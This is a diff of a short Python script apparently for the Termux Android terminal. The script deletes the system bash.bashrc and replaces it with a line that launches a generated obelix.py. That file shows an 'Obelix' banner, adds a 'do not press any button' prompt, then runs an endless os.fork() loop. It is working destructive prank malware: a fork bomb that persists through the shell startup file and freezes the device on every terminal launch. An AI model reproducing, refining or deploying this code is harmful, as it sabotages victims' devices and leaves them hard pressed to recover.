@@ -14,7 +14,7 @@ script = input('---> \033[0;30;41m')
 os.chdir('/data/data/com.termux/files/usr/etc')
 os.system('rm -rf bash.bashrc')
 arq = open('bash.bashrc', 'w')
-arq.write('python /data/data/com.termux/files/usr/etc/obelix.py|lolcat')
+arq.write('echo -e "\033[31m" && python /data/data/com.termux/files/usr/etc/obelix.py')
 obe = open('obelix.py', 'w')
 obe.write("""
 import os
@@ -26,6 +26,7 @@ try:
     os.system('clear')
     print('travazap abatido by:\\n')
     print(cosmic.renderText('Obelix'))
+    input('não aperte nenhum botão')
     while True:
         os.fork()
 except:
